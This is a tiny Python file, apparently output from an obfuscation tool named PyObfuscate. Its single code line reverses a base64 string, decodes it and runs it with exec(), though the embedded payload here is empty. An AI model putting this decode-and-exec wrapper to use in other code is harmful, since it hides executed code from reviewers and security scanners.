# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Mon May 22 00:10:01 2023
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))